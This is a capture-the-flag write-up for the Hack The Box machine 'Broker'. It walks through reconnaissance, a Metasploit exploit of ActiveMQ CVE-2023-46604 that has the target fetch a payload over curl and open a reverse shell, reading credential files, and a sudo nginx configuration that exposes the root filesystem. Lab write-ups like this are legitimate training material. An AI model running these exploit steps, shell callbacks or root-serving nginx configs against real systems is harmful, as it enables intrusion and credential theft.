---
{"dg-publish":true,"permalink":"/ct-fs/htb/broker/","dg-note-properties":{}}
---

#linux #apache-mq #sudo #nginx
## By 0xCapra_Daemon aka Will Keller

## Contents
[[CTFs/HTB/Broker#Recon\|#Recon]]
[[CTFs/HTB/Broker#Initial Foothold\|#Initial Foothold]]
[[CTFs/HTB/Broker#Privilege Escalation\|#Privilege Escalation]]
[[CTFs/HTB/Broker#Takeaways\|#Takeaways]]
## Recon
![Pasted image 20260718201351.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718201351.png)

```zsh
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.129.230.87
------------------------------------------------------------
Scanning target 10.129.230.87
Time started: 2026-07-18 23:16:24.579792
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port 1883 is open
Port 5672 is open
Port 8161 is open
Port 34211 is open
Port 61616 is open
Port 61613 is open
Port 61614 is open
Port scan completed in 0:00:32.316352
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80,1883,5672,8161,34211,61616,61613,61614 -sV -sC -T4 -Pn -oA 10.129.230.87 10.129.230.87
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80,1883,5672,8161,34211,61616,61613,61614 -sV -sC -T4 -Pn -oA 10.129.230.87 10.129.230.87
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 23:17 -0400
Nmap scan report for 10.129.230.87
Host is up (0.090s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
34211/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.99%I=7%D=7/18%Time=6A5C41BE%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"AM
SF:QP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1
SF:\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x0
SF:2\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x2
SF:0unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0A
SF:MQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`
SF:\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:d
SF:ecode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x2
SF:0AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\
SF:0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x0
SF:2\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Co
SF:nnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted
SF:")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\
SF:x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\
SF:0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connecti
SF:on\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(D
SF:NSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0
SF:\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x1
SF:8\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20f
SF:rom\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSessi
SF:onReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0
SF:\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S
SF:\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client
SF:\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie,
SF:89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x
SF:04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\x
SF:c0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20us
SF:ing\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.99%I=7%D=7/18%Time=6A5C41B8%P=x86_64-pc-linux-gnu%r(H
SF:ELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOMP
SF:\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoco
SF:lException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apache
SF:\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Protoc
SF:olConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.stom
SF:p\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\t
SF:at\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(Tr
SF:ansportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.tc
SF:p\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\.
SF:activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\n
SF:\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.70 seconds
------------------------------------------------------------
Combined scan completed in 0:01:18.851156
```
Initial `nmap` scan reveals several services running together in the ApacheMQ suite of services including an `nginx` and `jetty` server.

![Pasted image 20260718202326.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718202326.png)
![Pasted image 20260718202419.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718202419.png)
Manual visit to `nginx` server on port 80 reveals simple auth portal. However we were able to gain access to the `ActiveMQ` application with creds `admin:admin`. 

![Pasted image 20260718202548.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718202548.png)
Navigating to `Manage ActiveMQ broker` leaked the version number of the application we are running.

## Initial Foothold

![Pasted image 20260718204913.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718204913.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/broker/exploit]
└─$ msfconsole -q                   
msf > search apache mq

Matching Modules
================

   #   Name                                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                                 ---------------  ----       -----  -----------
   0   exploit/multi/http/apache_activemq_upload_jsp                        2016-06-01       excellent  No     ActiveMQ web shell upload
   1     \_ target: Java Universal                                          .                .          .      .
   2     \_ target: Linux                                                   .                .          .      .
   3     \_ target: Windows                                                 .                .          .      .
   4   exploit/windows/http/apache_activemq_traversal_upload                2015-08-19       excellent  Yes    Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload
   5   auxiliary/scanner/http/apache_activemq_traversal                     .                normal     No     Apache ActiveMQ Directory Traversal
   6   auxiliary/scanner/http/apache_activemq_source_disclosure             .                normal     No     Apache ActiveMQ JSP Files Source Disclosure
   7   exploit/multi/misc/apache_activemq_rce_cve_2023_46604                2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
   8     \_ target: Windows                                                 .                .          .      .
   9     \_ target: Linux                                                   .                .          .      .
   10    \_ target: Unix                                                    .                .          .      .
   11  exploit/linux/http/apache_airflow_dag_rce                            2020-07-14       excellent  Yes    Apache Airflow 1.10.10 - Example DAG Remote Code Execution
   12  exploit/multi/http/apache_ofbiz_forgot_password_directory_traversal  2024-05-30       excellent  Yes    Apache OFBiz forgotPassword/ProgramExport RCE
   13    \_ target: Linux Command                                           .                .          .      .
   14    \_ target: Windows Command                                         .                .          .      .
   15  auxiliary/scanner/misc/rocketmq_version                              .                normal     No     Apache RocketMQ Version Scanner
   16  exploit/multi/http/apache_rocketmq_update_config                     2023-05-23       excellent  Yes    Apache RocketMQ update config RCE
   17  exploit/linux/http/apache_solr_backup_restore                        2024-02-24       excellent  Yes    Apache Solr Backup/Restore APIs RCE


Interact with a module by name or index. For example info 17, use 17 or use exploit/linux/http/apache_solr_backup_restore

msf > use 7
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
msf exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > 

```
Brief google searching revealed `CVE-2023-46604` PoC script [[https://github.com/rootsecdev/CVE-2023-46604\|CVE-2023-46604]] on Github that mentioned having a Metasploit module. Loaded relevant module and setup payload for our linux target.

```zsh
msf exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > options

Module options (exploit/multi/misc/apache_activemq_rce_cve_2023_46604):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.129.230.87    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    61616            yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SRVSSL   false            no        Negotiate SSL/TLS for local server connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (cmd/linux/http/x64/shell_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python
                                              3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8090             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           10.10.14.192     yes       The listen address (an interface may be specified)
   LPORT           8888             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      KJbKSdoyz        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces

```
Setup Metasploit module to create and drop a linux reverse shell on the target system.

```zsh
msf exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > run
[*] Started reverse TCP handler on 10.10.14.192:8888 
[*] 10.129.230.87:61616 - Running automatic check ("set AutoCheck false" to disable)
[+] 10.129.230.87:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.15.15
[*] 10.129.230.87:61616 - Using URL: http://10.10.14.192:8080/0s8z3GKl
[*] 10.129.230.87:61616 - Sent ClassPathXmlApplicationContext configuration file.
[*] 10.129.230.87:61616 - Sent ClassPathXmlApplicationContext configuration file.
[*] Command shell session 2 opened (10.10.14.192:8888 -> 10.129.230.87:56114) at 2026-07-18 23:58:02 -0400
[*] 10.129.230.87:61616 - Server stopped.

id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)

```
Successfully caught reverse shell session on target as user `activemq`

```zsh
activemq@broker:/opt/apache-activemq-5.15.15/conf$ cat credentials.properties
cat credentials.properties
## ---------------------------------------------------------------------------
## Licensed to the Apache Software Foundation (ASF) under one or more
## contributor license agreements.  See the NOTICE file distributed with
## this work for additional information regarding copyright ownership.
## The ASF licenses this file to You under the Apache License, Version 2.0
## (the "License"); you may not use this file except in compliance with
## the License.  You may obtain a copy of the License at
## 
## http://www.apache.org/licenses/LICENSE-2.0
## 
## Unless required by applicable law or agreed to in writing, software
## distributed under the License is distributed on an "AS IS" BASIS,
## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
## See the License for the specific language governing permissions and
## limitations under the License.
## ---------------------------------------------------------------------------

# Defines credentials that will be used by components (like web console) to access the broker

activemq.username=system
activemq.password=manager
guest.password=passwordactivemq@broker:/opt/apache-activemq-5.15.15/conf
```
```zsh
guest.password=passwordactivemq@broker:/opt/apache-activemq-5.15.15/conf$ cat jmx.password
cat jmx.password
## ---------------------------------------------------------------------------
## Licensed to the Apache Software Foundation (ASF) under one or more
## contributor license agreements.  See the NOTICE file distributed with
## this work for additional information regarding copyright ownership.
## The ASF licenses this file to You under the Apache License, Version 2.0
## (the "License"); you may not use this file except in compliance with
## the License.  You may obtain a copy of the License at
##
## http://www.apache.org/licenses/LICENSE-2.0
##
## Unless required by applicable law or agreed to in writing, software
## distributed under the License is distributed on an "AS IS" BASIS,
## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
## See the License for the specific language governing permissions and
## limitations under the License.
## ---------------------------------------------------------------------------

admin activemqactivemq@broker
```
```zsh
activemq@broker:/opt/apache-activemq-5.15.15/conf$ cat credentials-enc.properties
cat credentials-enc.properties
## ---------------------------------------------------------------------------
## Licensed to the Apache Software Foundation (ASF) under one or more
## contributor license agreements.  See the NOTICE file distributed with
## this work for additional information regarding copyright ownership.
## The ASF licenses this file to You under the Apache License, Version 2.0
## (the "License"); you may not use this file except in compliance with
## the License.  You may obtain a copy of the License at
## 
## http://www.apache.org/licenses/LICENSE-2.0
## 
## Unless required by applicable law or agreed to in writing, software
## distributed under the License is distributed on an "AS IS" BASIS,
## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
## See the License for the specific language governing permissions and
## limitations under the License.
## ---------------------------------------------------------------------------

# Defines credentials that will be used by components (like web console) to access the broker

activemq.username=system
activemq.password=ENC(mYRkg+4Q4hua1kvpCCI2hg==)
guest.password=ENC(Cf3Jf3tM+UrSOoaKU50od5CuBa8rxjoL)
```
some light manual enumeration of the web app files revealed a `/conf` directory that contained several interesting files related to credentials.

```zsh
activemq@broker:/opt/apache-activemq-5.15.15/conf$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:/opt/apache-activemq-5.15.15/conf$ 
```
so fuck all that other shit. Manual enumeration of sudo privileges show that our user `activemq` can call `/usr/sbin/nginx` as `root` without authentication.

## Privilege Escalation
## [[https://gtfobins.org/gtfobins/nginx/#upload\|Upload]]

This executable can upload local data.

- Sudo
    
    This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.
    
    Remarks
    
    If there are environment variables involved, they must be passed via `sudo VAR=value ...` or exported then `sudo -E ...`.
    
    ```
    cat >/path/to/temp-file <<EOF
    user root;
    http {
      server {
        listen 80;
        root /;
        autoindex on;
        dav_methods PUT;
      }
    }
    events {}
    EOF
    
    nginx -c /path/to/temp-file
    ```
    
    Receiver
    
    An HTTP client can be used on the attacker box to receive the data.
    
    ```
    curl victim.com -o /path/to/output-file
    ```
![Pasted image 20260718213458.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718213458.png)
Found privesc vector on `GTFOBins` which allows us to host the system root as a webserver with our sudo misconfiguration.

![Pasted image 20260718213618.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718213618.png)
Navigating to our lower user `activemq`'s home folder we find our `user.txt`. 

![Pasted image 20260718213924.png](/img/user/CTFs/HTB/Images/Broker%20Images/Pasted%20image%2020260718213924.png)
Navigating to our `/root` directory we find our `root.txt`. 

## Takeaways
- be sure to actually read the exploits so that you understand **How** they work so that you can manipulate them as you need for your context
- A root shell isn't always necessary. Sometimes you'll be reading out the file system with elevated access instead.
